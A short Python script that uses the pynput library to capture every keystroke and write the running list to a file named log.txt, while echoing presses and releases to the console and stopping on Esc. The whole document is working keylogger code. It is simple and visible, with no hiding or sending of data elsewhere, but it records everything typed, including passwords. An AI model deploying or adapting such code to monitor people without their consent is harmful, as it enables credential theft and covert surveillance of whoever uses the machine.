from pynput.keyboard import Key, Listener

Keys = []

def on_press(key):
    Keys.append(key)
    write_file(Keys)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(Keys):
    with open('log.txt', 'w') as f:
        for key in Keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
